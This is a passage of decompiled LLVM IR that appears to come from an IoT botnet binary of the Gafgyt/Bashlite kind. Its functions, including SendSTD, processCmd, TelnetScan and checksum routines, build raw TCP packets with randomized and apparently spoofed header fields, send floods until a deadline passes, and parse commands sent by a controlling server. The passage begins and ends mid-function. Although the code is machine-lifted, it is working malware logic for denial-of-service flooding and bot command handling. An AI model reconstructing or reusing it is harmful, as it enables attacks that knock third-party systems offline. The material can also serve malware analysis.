  %v2_10560 = icmp eq i32 %v4_10558, 0
  br i1 %v2_10560, label %dec_label_pc_10568, label %dec_label_pc_1057c

dec_label_pc_10568:                               ; preds = %dec_label_pc_1054c
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_1056c = load i8, i8* %v2_1053c, align 1
  %v4_1056c = zext i8 %v3_1056c to i32
  %v1_10570 = or i32 %v4_1056c, 4
  store i32 %v1_10570, i32* %r3.global-to-local, align 4
  %v1_10574 = trunc i32 %v1_10570 to i8
  store i8 %v1_10574, i8* %v2_1053c, align 1
  br label %dec_label_pc_10608

dec_label_pc_1057c:                               ; preds = %dec_label_pc_1054c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f75c.920 to i32), i32* @r1, align 4
  %v4_10588 = call i32 @__GI_strcoll(i8* %v3_10528, i32 ptrtoint ([4 x i8]* @global_var_1f75c.920 to i32))
  store i32 %v4_10588, i32* %r3.global-to-local, align 4
  %v2_10590 = icmp eq i32 %v4_10588, 0
  br i1 %v2_10590, label %dec_label_pc_10598, label %dec_label_pc_105ac

dec_label_pc_10598:                               ; preds = %dec_label_pc_1057c
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_1059c = load i8, i8* %v2_1053c, align 1
  %v4_1059c = zext i8 %v3_1059c to i32
  %v1_105a0 = or i32 %v4_1059c, 1
  store i32 %v1_105a0, i32* %r3.global-to-local, align 4
  %v1_105a4 = trunc i32 %v1_105a0 to i8
  store i8 %v1_105a4, i8* %v2_1053c, align 1
  br label %dec_label_pc_10608

dec_label_pc_105ac:                               ; preds = %dec_label_pc_1057c
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f760.922 to i32), i32* @r1, align 4
  %v4_105b8 = call i32 @__GI_strcoll(i8* %v3_10528, i32 ptrtoint ([4 x i8]* @global_var_1f760.922 to i32))
  store i32 %v4_105b8, i32* %r3.global-to-local, align 4
  %v2_105c0 = icmp eq i32 %v4_105b8, 0
  br i1 %v2_105c0, label %dec_label_pc_105c8, label %dec_label_pc_105dc

dec_label_pc_105c8:                               ; preds = %dec_label_pc_105ac
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_105cc = load i8, i8* %v2_1053c, align 1
  %v4_105cc = zext i8 %v3_105cc to i32
  %v1_105d0 = or i32 %v4_105cc, 16
  store i32 %v1_105d0, i32* %r3.global-to-local, align 4
  %v1_105d4 = trunc i32 %v1_105d0 to i8
  store i8 %v1_105d4, i8* %v2_1053c, align 1
  br label %dec_label_pc_10608

dec_label_pc_105dc:                               ; preds = %dec_label_pc_105ac
  store i32 %storemerge1421, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f764.924 to i32), i32* @r1, align 4
  %v4_105e8 = call i32 @__GI_strcoll(i8* %v3_10528, i32 ptrtoint ([4 x i8]* @global_var_1f764.924 to i32))
  store i32 %v4_105e8, i32* %r3.global-to-local, align 4
  %v2_105f0 = icmp eq i32 %v4_105e8, 0
  br i1 %v2_105f0, label %dec_label_pc_105f8, label %dec_label_pc_10608

dec_label_pc_105f8:                               ; preds = %dec_label_pc_105dc
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v3_105fc = load i8, i8* %v2_1053c, align 1
  %v4_105fc = zext i8 %v3_105fc to i32
  %v1_10600 = or i32 %v4_105fc, 8
  store i32 %v1_10600, i32* %r3.global-to-local, align 4
  %v1_10604 = trunc i32 %v1_10600 to i8
  store i8 %v1_10604, i8* %v2_1053c, align 1
  br label %dec_label_pc_10608

dec_label_pc_10608:                               ; preds = %dec_label_pc_105dc, %dec_label_pc_105c8, %dec_label_pc_10598, %dec_label_pc_10568, %dec_label_pc_10538, %dec_label_pc_105f8
  store i32 0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1f750.914 to i32), i32* @r1, align 4
  %v2_10610 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1f750.914 to i32))
  store i32 %v2_10610, i32* %r3.global-to-local, align 4
  %v2_10620 = icmp eq i32 %v2_10610, 0
  br i1 %v2_10620, label %dec_label_pc_10628, label %dec_label_pc_1051c

dec_label_pc_10628:                               ; preds = %dec_label_pc_10608, %dec_label_pc_10500, %dec_label_pc_104ac
  %v0_10628 = call i32 @rand_cmwc()
  %v3_10634 = urem i32 %v0_10628, 65536
  store i32 %v3_10634, i32* %r3.global-to-local, align 4
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v1_1063c = trunc i32 %v0_10628 to i8
  %v3_1063c = add i32 %v3_103d0, 34
  %v4_1063c = inttoptr i32 %v3_1063c to i8*
  store i8 %v1_1063c, i8* %v4_1063c, align 2
  %v0_10640 = load i32, i32* %r3.global-to-local, align 4
  %v3_1064025 = udiv i32 %v0_10640, 256
  %v1_10644 = trunc i32 %v3_1064025 to i8
  %v2_10644 = load i32, i32* %r2.global-to-local, align 4
  %v3_10644 = add i32 %v2_10644, 15
  %v4_10644 = inttoptr i32 %v3_10644 to i8*
  store i8 %v1_10644, i8* %v4_10644, align 1
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10650 = add i32 %v3_103d0, 36
  %v4_10650 = inttoptr i32 %v3_10650 to i8*
  store i8 0, i8* %v4_10650, align 4
  %v0_10654 = load i32, i32* %r3.global-to-local, align 4
  %v1_10654 = trunc i32 %v0_10654 to i8
  %v2_10654 = load i32, i32* %r2.global-to-local, align 4
  %v3_10654 = add i32 %v2_10654, 17
  %v4_10654 = inttoptr i32 %v3_10654 to i8*
  store i8 %v1_10654, i8* %v4_10654, align 1
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_10660 = add i32 %v3_103d0, 38
  %v4_10660 = inttoptr i32 %v3_10660 to i8*
  store i8 0, i8* %v4_10660, align 2
  %v0_10664 = load i32, i32* %r3.global-to-local, align 4
  %v1_10664 = trunc i32 %v0_10664 to i8
  %v2_10664 = load i32, i32* %r2.global-to-local, align 4
  %v3_10664 = add i32 %v2_10664, 19
  %v4_10664 = inttoptr i32 %v3_10664 to i8*
  store i8 %v1_10664, i8* %v4_10664, align 1
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_10284, label %dec_label_pc_10674, label %dec_label_pc_1068c

dec_label_pc_10674:                               ; preds = %dec_label_pc_10628
  %v0_10674 = call i32 @rand_cmwc()
  %v3_1067c = mul i32 %v0_10674, 65536
  store i32 %v3_1067c, i32* %r3.global-to-local, align 4
  %extract.t = trunc i32 %v0_10674 to i8
  br label %dec_label_pc_106a8

dec_label_pc_1068c:                               ; preds = %dec_label_pc_10628
  %v3_10694 = urem i32 %arg2, 65536
  store i32 %v3_10694, i32* %r3.global-to-local, align 4
  %v1_1069c = call i32 @htons(i32 %v3_10694)
  %extract.t71 = trunc i32 %v1_1069c to i8
  br label %dec_label_pc_106a8

dec_label_pc_106a8:                               ; preds = %dec_label_pc_10674, %dec_label_pc_1068c
  %v0_10674.sink.off0 = phi i8 [ %extract.t, %dec_label_pc_10674 ], [ %extract.t71, %dec_label_pc_1068c ]
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v4_106ac = sext i8 %v0_10674.sink.off0 to i32
  %v3_106b0 = add i32 %v3_103d0, 22
  %v4_106b0 = inttoptr i32 %v3_106b0 to i8*
  store i8 %v0_10674.sink.off0, i8* %v4_106b0, align 2
  %v3_106b8 = sdiv i32 %v4_106ac, 256
  %v4_106b8 = trunc i32 %v3_106b8 to i8
  store i32 %v3_106b8, i32* %r3.global-to-local, align 4
  %v4_106bc = add i32 %v3_103d0, 23
  %v5_106bc = inttoptr i32 %v4_106bc to i8*
  store i8 %v4_106b8, i8* %v5_106bc, align 1
  %v5_106c8 = call i32 @tcpcsum(i32 %v3_103d0, i32 %v1_103f0, i32 %v1_103f0, i32 %v3_106b8)
  %sext = mul i32 %v5_106c8, 16777216
  %v1_106cc = sdiv i32 %sext, 16777216
  store i32 %v1_106cc, i32* %r3.global-to-local, align 4
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v1_106d4 = trunc i32 %v1_106cc to i8
  store i8 %v1_106d4, i8* %v4_10650, align 4
  %v0_106d8 = load i32, i32* %r3.global-to-local, align 4
  %v3_106d828 = udiv i32 %v0_106d8, 256
  %v1_106dc = trunc i32 %v3_106d828 to i8
  %v2_106dc = load i32, i32* %r2.global-to-local, align 4
  %v3_106dc = add i32 %v2_106dc, 17
  %v4_106dc = inttoptr i32 %v3_106dc to i8*
  store i8 %v1_106dc, i8* %v4_106dc, align 1
  %v1_106ec = or i32 %v3_103d0, 2
  store i32 %v1_106ec, i32* %r3.global-to-local, align 4
  %v1_106f0 = inttoptr i32 %v1_106ec to i8*
  %v2_106f0 = load i8, i8* %v1_106f0, align 2
  %v3_106f0 = zext i8 %v2_106f0 to i32
  store i32 %v3_106f0, i32* %r2.global-to-local, align 4
  %v1_106f4 = or i32 %v1_103cc, 3
  %v2_106f4 = inttoptr i32 %v1_106f4 to i8*
  %v3_106f4 = load i8, i8* %v2_106f4, align 1
  %v4_106f4 = zext i8 %v3_106f4 to i32
  %v4_106f8 = mul nuw nsw i32 %v4_106f4, 256
  %v5_106f8 = or i32 %v4_106f8, %v3_106f0
  store i32 %v5_106f8, i32* %r3.global-to-local, align 4
  %v3_10704 = call i32 @csum(i8* %v4_1042c, i32 %v5_106f8)
  %sext4 = mul i32 %v3_10704, 16777216
  %v1_10708 = sdiv i32 %sext4, 16777216
  store i32 %v1_10708, i32* %r3.global-to-local, align 4
  store i32 %v3_103d0, i32* %r2.global-to-local, align 4
  %v1_10710 = trunc i32 %v1_10708 to i8
  %v3_10710 = add i32 %v3_103d0, 10
  %v4_10710 = inttoptr i32 %v3_10710 to i8*
  store i8 %v1_10710, i8* %v4_10710, align 2
  %v0_10714 = load i32, i32* %r3.global-to-local, align 4
  %v3_10714 = sdiv i32 %v0_10714, 256
  store i32 %v3_10714, i32* %r3.global-to-local, align 4
  %v1_10718 = trunc i32 %v3_10714 to i8
  %v2_10718 = load i32, i32* %r2.global-to-local, align 4
  %v3_10718 = add i32 %v2_10718, 11
  %v4_10718 = inttoptr i32 %v3_10718 to i8*
  store i8 %v1_10718, i8* %v4_10718, align 1
  %v2_10720 = call i32 @__GI_time(i32* null)
  %v2_1072c = add i32 %v2_10720, %arg3
  store i32 %v2_1072c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_10784 = add i32 %v3_103d0, 12
  %v3_10784 = inttoptr i32 %v2_10784 to i32*
  %v3_1079c = add i32 %v3_103d0, 4
  %v4_1079c = inttoptr i32 %v3_1079c to i8*
  %v4_107e4 = add i32 %v3_103d0, 37
  %v5_107e4 = inttoptr i32 %v4_107e4 to i8*
  br label %dec_label_pc_10740

dec_label_pc_10740:                               ; preds = %dec_label_pc_10878, %dec_label_pc_1086c, %dec_label_pc_106a8
  %stack_var_-88.0 = phi i32 [ 0, %dec_label_pc_106a8 ], [ 0, %dec_label_pc_1086c ], [ %v1_1087c, %dec_label_pc_10878 ]
  store i32 %v3_103d0, i32* %r2.global-to-local, align 4
  %v1_10748 = load i32, i32* @sp, align 4
  %v2_10748 = inttoptr i32 %v1_10748 to i32*
  store i32 %v2_102f4, i32* %v2_10748, align 4
  %v1_10750 = load i32, i32* @sp, align 4
  %v2_10750 = add i32 %v1_10750, 4
  %v3_10750 = inttoptr i32 %v2_10750 to i32*
  store i32 16, i32* %v3_10750, align 4
  %v0_10758 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_103a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_10764 = inttoptr i32 %v0_10758 to i32*
  %v5_10764 = call i32 @__libc_sendto(i32 %v0_10318, i32* %v4_10764, i32 %v1_103a0, i32 0)
  %v1_1076c = call i32 @TelnetScan(i32 %storemerge10)
  store i32 %v1_1076c, i32* %r3.global-to-local, align 4
  %v1_10778 = call i32 @htonl(i32 %v1_1076c)
  store i32 %v1_10778, i32* %r2.global-to-local, align 4
  store i32 %v3_103d0, i32* %r3.global-to-local, align 4
  store i32 %v1_10778, i32* %v3_10784, align 4
  %v0_10788 = call i32 @rand_cmwc()
  %v3_10794 = urem i32 %v0_10788, 65536
  store i32 %v3_10794, i32* %r3.global-to-local, align 4
  store i32 %v3_103d0, i32* %r2.global-to-local, align 4
  %v1_1079c = trunc i32 %v0_10788 to i8
  store i8 %v1_1079c, i8* %v4_1079c, align 4
  %v0_107a0 = load i32, i32* %r3.global-to-local, align 4
  %v3_107a0 = sdiv i32 %v0_107a0, 256
  store i32 %v3_107a0, i32* %r3.global-to-local, align 4
  %v1_107a4 = trunc i32 %v3_107a0 to i8
  %v2_107a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_107a4 = add i32 %v2_107a4, 5
  %v4_107a4 = inttoptr i32 %v3_107a4 to i8*
  store i8 %v1_107a4, i8* %v4_107a4, align 1
  %v0_107a8 = call i32 @rand_cmwc()
  store i32 %v0_107a8, i32* %r2.global-to-local, align 4
  store i32 %v1_103f0, i32* %r3.global-to-local, align 4
  store i32 %v0_107a8, i32* %v3_1045c, align 4
  %v0_107b8 = call i32 @rand_cmwc()
  %v3_107c4 = urem i32 %v0_107b8, 65536
  store i32 %v3_107c4, i32* %r3.global-to-local, align 4
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v1_107cc = trunc i32 %v0_107b8 to i8
  store i8 %v1_107cc, i8* %v5_103f4, align 4
  %v0_107d0 = load i32, i32* %r3.global-to-local, align 4
  %v3_107d029 = udiv i32 %v0_107d0, 256
  %v1_107d4 = trunc i32 %v3_107d029 to i8
  %v2_107d4 = load i32, i32* %r2.global-to-local, align 4
  %v3_107d4 = add i32 %v2_107d4, 1
  %v4_107d4 = inttoptr i32 %v3_107d4 to i8*
  store i8 %v1_107d4, i8* %v4_107d4, align 1
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i8 0, i8* %v4_10650, align 4
  store i8 0, i8* %v5_107e4, align 1
  %v5_107f0 = call i32 @tcpcsum(i32 %v3_103d0, i32 %v1_103f0, i32 %v1_103f0, i32 0)
  %sext5 = mul i32 %v5_107f0, 16777216
  %v1_107f4 = sdiv i32 %sext5, 16777216
  store i32 %v1_107f4, i32* %r3.global-to-local, align 4
  store i32 %v1_103f0, i32* %r2.global-to-local, align 4
  %v1_107fc = trunc i32 %v1_107f4 to i8
  store i8 %v1_107fc, i8* %v4_10650, align 4
  %v0_10800 = load i32, i32* %r3.global-to-local, align 4
  %v3_1080030 = udiv i32 %v0_10800, 256
  %v1_10804 = trunc i32 %v3_1080030 to i8
  %v2_10804 = load i32, i32* %r2.global-to-local, align 4
  %v3_10804 = add i32 %v2_10804, 17
  %v4_10804 = inttoptr i32 %v3_10804 to i8*
  store i8 %v1_10804, i8* %v4_10804, align 1
  store i32 %v1_106ec, i32* %r3.global-to-local, align 4
  %v2_10818 = load i8, i8* %v1_106f0, align 2
  %v3_10818 = zext i8 %v2_10818 to i32
  store i32 %v3_10818, i32* %r2.global-to-local, align 4
  %v3_1081c = load i8, i8* %v2_106f4, align 1
  %v4_1081c = zext i8 %v3_1081c to i32
  %v4_10820 = mul nuw nsw i32 %v4_1081c, 256
  %v5_10820 = or i32 %v4_10820, %v3_10818
  store i32 %v5_10820, i32* %r3.global-to-local, align 4
  %v3_1082c = call i32 @csum(i8* %v4_1042c, i32 %v5_10820)
  %sext6 = mul i32 %v3_1082c, 16777216
  %v1_10830 = sdiv i32 %sext6, 16777216
  store i32 %v1_10830, i32* %r3.global-to-local, align 4
  store i32 %v3_103d0, i32* %r2.global-to-local, align 4
  %v1_10838 = trunc i32 %v1_10830 to i8
  store i8 %v1_10838, i8* %v4_10710, align 2
  %v0_1083c = load i32, i32* %r3.global-to-local, align 4
  %v3_1083c31 = udiv i32 %v0_1083c, 256
  %v1_10840 = trunc i32 %v3_1083c31 to i8
  %v2_10840 = load i32, i32* %r2.global-to-local, align 4
  %v3_10840 = add i32 %v2_10840, 11
  %v4_10840 = inttoptr i32 %v3_10840 to i8*
  store i8 %v1_10840, i8* %v4_10840, align 1
  store i32 %stack_var_-88.0, i32* %r3.global-to-local, align 4
  %v9_1084c = icmp eq i32 %stack_var_-88.0, %arg6
  br i1 %v9_1084c, label %dec_label_pc_10854, label %dec_label_pc_10878

dec_label_pc_10854:                               ; preds = %dec_label_pc_10740
  %v2_10858 = call i32 @__GI_time(i32* null)
  store i32 %v2_10858, i32* %r2.global-to-local, align 4
  store i32 %v2_1072c, i32* %r3.global-to-local, align 4
  %v8_10868 = icmp sgt i32 %v2_10858, %v2_1072c
  br i1 %v8_10868, label %dec_label_pc_10888, label %dec_label_pc_1086c

dec_label_pc_1086c:                               ; preds = %dec_label_pc_10854
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10740

dec_label_pc_10878:                               ; preds = %dec_label_pc_10740
  %v1_1087c = add i32 %stack_var_-88.0, 1
  store i32 %v1_1087c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10740

dec_label_pc_10888:                               ; preds = %dec_label_pc_10854, %dec_label_pc_10334, %dec_label_pc_102f4, %dec_label_pc_102d0
  %v12_10890 = phi i32 [ %v6_10358, %dec_label_pc_10334 ], [ 0, %dec_label_pc_102f4 ], [ %v3_102e0, %dec_label_pc_102d0 ], [ %v2_10858, %dec_label_pc_10854 ]
  store i32 %v3_10244, i32* @r4, align 4
  store i32 %v6_10244, i32* @fp, align 4
  ret i32 %v12_10890

; uselistorder directives
  uselistorder i32 %v1_1087c, { 1, 0 }
  uselistorder i32 %v1_10830, { 1, 0 }
  uselistorder i32 %v1_107f4, { 1, 0 }
  uselistorder i32 %v0_107b8, { 1, 0 }
  uselistorder i32 %v3_107a0, { 1, 0 }
  uselistorder i32 %v0_10788, { 1, 0 }
  uselistorder i32 %stack_var_-88.0, { 0, 2, 1 }
  uselistorder i32 %v2_1072c, { 1, 0, 2 }
  uselistorder i32 %v3_10714, { 1, 0 }
  uselistorder i32 %v1_10708, { 1, 0 }
  uselistorder i32 %v1_106ec, { 0, 2, 1 }
  uselistorder i32 %v1_106cc, { 1, 0 }
  uselistorder i32 %v3_106b8, { 2, 0, 1 }
  uselistorder i8 %v0_10674.sink.off0, { 1, 0 }
  uselistorder i32 %v3_10694, { 1, 0 }
  uselistorder i32 %v0_10674, { 1, 0 }
  uselistorder i32 %v0_10628, { 1, 0 }
  uselistorder i32 %v2_10610, { 1, 0, 2 }
  uselistorder i32 %storemerge1421, { 5, 4, 3, 2, 0, 1 }
  uselistorder i8* %v2_1053c, { 4, 5, 3, 6, 2, 7, 1, 8, 0, 9 }
  uselistorder i8* %v2_104b0, { 1, 5, 2, 6, 3, 7, 4, 8, 0, 9 }
  uselistorder i32 %v3_10448, { 1, 0 }
  uselistorder i32 %v0_10430, { 1, 0 }
  uselistorder i32 %v1_103f0, { 5, 7, 6, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 22, 21, 20, 19, 18, 0, 1, 2, 3, 4, 23, 24, 25, 26 }
  uselistorder i32 %v3_103d0, { 12, 11, 10, 8, 6, 23, 9, 7, 4, 5, 22, 3, 21, 20, 19, 18, 17, 16, 24, 15, 14, 13, 2, 1, 0 }
  uselistorder i32 %v1_103a0, { 1, 0 }
  uselistorder i32 %v3_102b4, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 6, 7, 4, 5, 11, 12, 8, 9, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 24, 25, 22, 23, 27, 28, 26, 29, 30, 31, 32, 33, 34, 35, 36, 37, 53, 38, 39, 40, 41, 43, 42, 44, 46, 45, 47, 49, 48, 50, 52, 51, 80, 54, 55, 56, 57, 58, 59, 62, 60, 61, 63, 64, 65, 66, 68, 67, 69, 70, 72, 71, 73, 74, 76, 75, 77, 78, 79, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @tcpcsum, { 1, 0 }
  uselistorder i32 (i32)* @htonl, { 1, 0 }
  uselistorder i32 (i32)* @TelnetScan, { 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %arg2, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_106a8, { 1, 0 }
  uselistorder label %dec_label_pc_10608, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_1051c, { 1, 0 }
  uselistorder label %dec_label_pc_1039c, { 1, 0 }
  uselistorder label %dec_label_pc_102d0, { 1, 0 }
}

define i32 @SendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 67772, i32* %stack_var_-4, align 4
  %v2_108b8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_108b8, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  %v0_108d8 = call i32 @socket()
  %v2_108e8 = call i32 @__GI_time(i32* null)
  %v1_108fc = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_10918 = bitcast i32* %stack_var_-48 to i8*
  %v3_10918 = call i32 @__GI_memset(i8* %v2_10918, i32 0)
  %v1_10920 = add i32 %v1_108fc, 16
  %v2_10920 = inttoptr i32 %v1_10920 to i32*
  %v3_10920 = load i32, i32* %v2_10920, align 4
  %v1_10924 = inttoptr i32 %v3_10920 to i32*
  %v2_10924 = load i32, i32* %v1_10924, align 4
  %v2_1092c = ptrtoint i32* %stack_var_-44 to i32
  %v1_10934 = add i32 %v1_108fc, 12
  %v2_10934 = inttoptr i32 %v1_10934 to i32*
  %v3_10934 = load i32, i32* %v2_10934, align 4
  store i32 %v3_10934, i32* @r2, align 4
  %v3_10944 = call i32 @bcopy(i32 %v2_10924, i32 %v2_1092c, i32 %v3_10934)
  %v1_1094c = add i32 %v1_108fc, 8
  %v2_1094c = inttoptr i32 %v1_1094c to i32*
  %v3_1094c = load i32, i32* %v2_1094c, align 4
  %v3_10954 = urem i32 %v3_1094c, 65536
  store i32 %v3_10954, i32* %stack_var_-48, align 4
  %v3_109b4 = bitcast i32* %stack_var_-48 to %sockaddr*
  br label %dec_label_pc_10984

dec_label_pc_10984:                               ; preds = %dec_label_pc_109f0, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_109f4, %dec_label_pc_109f0 ]
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_109f0, label %dec_label_pc_10990

dec_label_pc_10990:                               ; preds = %dec_label_pc_10984
  %v6_109a0 = call i32 @__libc_send(i32 %v0_108d8, i32* bitcast ([4 x i8]* @global_var_1f768.926 to i32*), i32 69, i32 0)
  %v4_109b4 = call i32 @__libc_connect(i32 %v0_108d8, %sockaddr* %v3_109b4, i32 16)
  %v2_109bc = call i32 @__GI_time(i32* null)
  %v3_109c8 = load i32, i32* %stack_var_-60, align 4
  %v2_109cc = add i32 %v3_109c8, %v2_108e8
  %v5_109d4 = icmp slt i32 %v2_109bc, %v2_109cc
  br i1 %v5_109d4, label %dec_label_pc_109e8, label %dec_label_pc_109d8

dec_label_pc_109d8:                               ; preds = %dec_label_pc_10990
  %v1_109dc = call i32 @__libc_close(i32 %v0_108d8)
  %v1_109e4 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_109e8:                               ; preds = %dec_label_pc_10990
  br label %dec_label_pc_109f0

dec_label_pc_109f0:                               ; preds = %dec_label_pc_10984, %dec_label_pc_109e8
  %stack_var_-20.0 = phi i32 [ %storemerge3, %dec_label_pc_10984 ], [ 0, %dec_label_pc_109e8 ]
  %v1_109f4 = add i32 %stack_var_-20.0, 1
  br label %dec_label_pc_10984

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_10934, { 1, 0 }
  uselistorder i32 %v1_108fc, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_109f0, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_10a04 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_10a04, i32* @ip, align 4
  %v3_10a08 = load i32, i32* @r4, align 4
  %v6_10a08 = load i32, i32* @r5, align 4
  %v9_10a08 = load i32, i32* @r6, align 4
  %v12_10a08 = load i32, i32* @r7, align 4
  %v15_10a08 = load i32, i32* @r8, align 4
  %v18_10a08 = load i32, i32* @fp, align 4
  store i32 68112, i32* %stack_var_-4, align 4
  %v2_10a0c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_10a0c, i32* @fp, align 4
  %v2_10a20 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_1e5d0.73 to i32), i32* @r1, align 4
  %v3_10a2c = inttoptr i32 %v2_10a20 to i8*
  %v4_10a2c = call i32 @__GI_strcoll(i8* %v3_10a2c, i32 ptrtoint ([5 x i8]* @global_var_1e5d0.73 to i32))
  %v2_10a34 = icmp eq i32 %v4_10a2c, 0
  br i1 %v2_10a34, label %dec_label_pc_10a3c, label %dec_label_pc_10a54

dec_label_pc_10a3c:                               ; preds = %entry
  %v2_10a40 = load i32, i32* @global_var_29910.71, align 4
  %v3_10a4c = call i32 @sockprintf(i32 %v2_10a40, i32 ptrtoint ([6 x i8]* @global_var_1f76c.930 to i32))
  br label %dec_label_pc_11314

dec_label_pc_10a54:                               ; preds = %entry
  %v2_10a58 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_1f774.932 to i32), i32* @r1, align 4
  %v3_10a64 = inttoptr i32 %v2_10a58 to i8*
  %v4_10a64 = call i32 @__GI_strcoll(i8* %v3_10a64, i32 ptrtoint ([7 x i8]* @global_var_1f774.932 to i32))
  %v2_10a6c = icmp eq i32 %v4_10a64, 0
  br i1 %v2_10a6c, label %dec_label_pc_10a74, label %dec_label_pc_10b88

dec_label_pc_10a74:                               ; preds = %dec_label_pc_10a54
  %v7_10a78 = icmp eq i32 %arg1, 2
  br i1 %v7_10a78, label %dec_label_pc_10a98, label %dec_label_pc_10a80

dec_label_pc_10a80:                               ; preds = %dec_label_pc_10a74
  %v2_10a84 = load i32, i32* @global_var_29910.71, align 4
  %v3_10a90 = call i32 @sockprintf(i32 %v2_10a84, i32 ptrtoint ([16 x i8]* @global_var_1f77c.934 to i32))
  br label %dec_label_pc_11314

dec_label_pc_10a98:                               ; preds = %dec_label_pc_10a74
  %v1_10a9c = add i32 %tmp, 4
  %v1_10aa0 = inttoptr i32 %v1_10a9c to i32*
  %v2_10aa0 = load i32, i32* %v1_10aa0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_1f78c.936 to i32), i32* @r1, align 4
  %v3_10aac = inttoptr i32 %v2_10aa0 to i8*
  %v4_10aac = call i32 @__GI_strcoll(i8* %v3_10aac, i32 ptrtoint ([4 x i8]* @global_var_1f78c.936 to i32))
  %v2_10ab4 = icmp eq i32 %v4_10aac, 0
  br i1 %v2_10ab4, label %dec_label_pc_10abc, label %dec_label_pc_10b00

dec_label_pc_10abc:                               ; preds = %dec_label_pc_10a98
  %v2_10ac0 = load i32, i32* @global_var_2fb90.938, align 4
  %v2_10ac4 = icmp eq i32 %v2_10ac0, 0
  br i1 %v2_10ac4, label %dec_label_pc_11314, label %dec_label_pc_10acc

dec_label_pc_10acc:                               ; preds = %dec_label_pc_10abc
  %v0_10adc = call i32 @kill()
  %v2_10ae4 = load i32, i32* @global_var_29910.71, align 4
  %v3_10af0 = call i32 @sockprintf(i32 %v2_10ae4, i32 ptrtoint ([13 x i8]* @global_var_1f790.940 to i32))
  store i32 0, i32* @global_var_2fb90.938, align 4
  br label %dec_label_pc_10b00

dec_label_pc_10b00:                               ; preds = %dec_label_pc_10a98, %dec_label_pc_10acc
  %v2_10b08 = load i32, i32* %v1_10aa0, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1f7a0.942 to i32), i32* @r1, align 4
  %v3_10b14 = inttoptr i32 %v2_10b08 to i8*
  %v4_10b14 = call i32 @__GI_strcoll(i8* %v3_10b14, i32 ptrtoint ([3 x i8]* @global_var_1f7a0.942 to i32))
